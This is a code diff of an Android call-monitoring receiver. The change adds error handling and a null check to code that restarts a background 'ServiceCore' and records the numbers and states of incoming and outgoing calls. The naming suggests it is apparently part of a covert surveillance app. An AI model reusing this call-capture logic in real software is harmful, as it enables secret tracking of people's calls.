@@ -24,7 +24,7 @@ public class BroadcastMonitorCall extends BroadcastReceiver {
 	/** The Constant TAG. */
 	private static final String TAG = "BroadcastMonitorCall"; //$NON-NLS-1$
 	private static Call call = null;
-	
+
 	/*
 	 * (non-Javadoc)
 	 * 
@@ -33,91 +33,111 @@ public class BroadcastMonitorCall extends BroadcastReceiver {
 	 */
 	@Override
 	public void onReceive(Context context, Intent intent) {
-		if (Core.isServiceRunning() == false) {
-			Intent serviceIntent = new Intent(context, ServiceCore.class);
-			
-		    //serviceIntent.setAction(Messages.getString("com.android.service.ServiceCore"));
-		    context.startService(serviceIntent);
-			
-		    if (Cfg.DEBUG) {
-				Check.log(TAG + " (onReceive): Started from Call"); //$NON-NLS-1$
-			}
-		    
-			return;
-		}
+		try {
+			if (Core.isServiceRunning() == false) {
+				Intent serviceIntent = new Intent(context, ServiceCore.class);
 
-		if (intent == null) {
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (onReceive): Intent null"); //$NON-NLS-1$
-			}
+				// serviceIntent.setAction(Messages.getString("com.android.service.ServiceCore"));
+				context.startService(serviceIntent);
 
-			return;
-		}
-
-		String extraIntent = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
-		
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " (onReceive): extraIntent: " + extraIntent); //$NON-NLS-1$
-		}
-		
-		if (intent.getAction().equals(Intent.ACTION_NEW_OUTGOING_CALL)) {
-			final String number = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
-
-			// Outgoing phone call
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (onReceive): 1, number: " + number);//$NON-NLS-1$
-			}
-
-			call = new Call(number, Call.OUTGOING, Call.START);
-		} else if (extraIntent.equals(TelephonyManager.EXTRA_STATE_RINGING)) { // Il numero lo abbiamo solo qui!
-			final String number = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
-
-			// Phone is ringing
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (onReceive): 2");//$NON-NLS-1$
-			}
-
-			call = new Call(number, Call.INCOMING, Call.START);
-		} else if (extraIntent.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
-			// Call disconnected
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (onReceive): 3");//$NON-NLS-1$
-			}
-
-			if (call.isIncoming())
-				call = new Call("", Call.INCOMING, Call.END); //$NON-NLS-1$
-			else
-				call = new Call("", Call.OUTGOING, Call.END); //$NON-NLS-1$
-			
-			call.setComplete();
-		} else if (extraIntent.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) { // Qui la chiamata e' davvero in corso
-			// Call answered, or issuing new outgoing call
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (onReceive): 4");//$NON-NLS-1$
-			}
-
-			if (call == null) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (onReceive): we didn't catch the ringing"); //$NON-NLS-1$
+					Check.log(TAG + " (onReceive): Started from Call"); //$NON-NLS-1$
 				}
-			} else {
-				call.setComplete();
-				Check.log(TAG + " (onReceive): 4, call ready");//$NON-NLS-1$
+
+				return;
 			}
-			
-			//call = new Call("", Call.OUTGOING, Call.START); //$NON-NLS-1$
-		} else {
+
+			if (intent == null) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (onReceive): Intent null"); //$NON-NLS-1$
+				}
+
+				return;
+			}
+
+			String extraIntent = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
+
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (onReceive): default");//$NON-NLS-1$
+				Check.log(TAG + " (onReceive): extraIntent: " + extraIntent); //$NON-NLS-1$
 			}
 
-			call = new Call("", Call.OUTGOING, Call.END); //$NON-NLS-1$
-			call.setComplete();
-		}
+			if (intent.getAction().equals(Intent.ACTION_NEW_OUTGOING_CALL)) {
+				final String number = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
 
-		// Caller/Callee number, incoming?/outgoing, in progress?/disconnected
-		if (call != null && call.isComplete() == true) {
-			ListenerCall.self().dispatch(call);
+				// Outgoing phone call
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (onReceive): 1, number: " + number);//$NON-NLS-1$
+				}
+
+				call = new Call(number, Call.OUTGOING, Call.START);
+			} else if (extraIntent.equals(TelephonyManager.EXTRA_STATE_RINGING)) { // Il
+																					// numero
+																					// lo
+																					// abbiamo
+																					// solo
+																					// qui!
+				final String number = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
+
+				// Phone is ringing
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (onReceive): 2");//$NON-NLS-1$
+				}
+
+				call = new Call(number, Call.INCOMING, Call.START);
+			} else if (extraIntent.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
+				// Call disconnected
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (onReceive): 3");//$NON-NLS-1$
+				}
+
+				if (call != null) {
+					if (call.isIncoming())
+						call = new Call("", Call.INCOMING, Call.END); //$NON-NLS-1$
+					else
+						call = new Call("", Call.OUTGOING, Call.END); //$NON-NLS-1$
+
+					call.setComplete();
+				}
+			} else if (extraIntent.equals(TelephonyManager.EXTRA_STATE_OFFHOOK)) { // Qui
+																					// la
+																					// chiamata
+																					// e'
+																					// davvero
+																					// in
+																					// corso
+				// Call answered, or issuing new outgoing call
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (onReceive): 4");//$NON-NLS-1$
+				}
+
+				if (call == null) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (onReceive): we didn't catch the ringing"); //$NON-NLS-1$
+					}
+				} else {
+					call.setComplete();
+					Check.log(TAG + " (onReceive): 4, call ready");//$NON-NLS-1$
+				}
+
+				//call = new Call("", Call.OUTGOING, Call.START); //$NON-NLS-1$
+			} else {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (onReceive): default");//$NON-NLS-1$
+				}
+
+				call = new Call("", Call.OUTGOING, Call.END); //$NON-NLS-1$
+				call.setComplete();
+			}
+
+			// Caller/Callee number, incoming?/outgoing, in
+			// progress?/disconnected
+			if (call != null && call.isComplete() == true) {
+				ListenerCall.self().dispatch(call);
+			}
+		} catch (Exception ex) {
+			if (Cfg.EXCEPTION) {
+				Check.log(TAG + " (onReceive) Error: " + ex);
+			}
 		}
 	}
 }
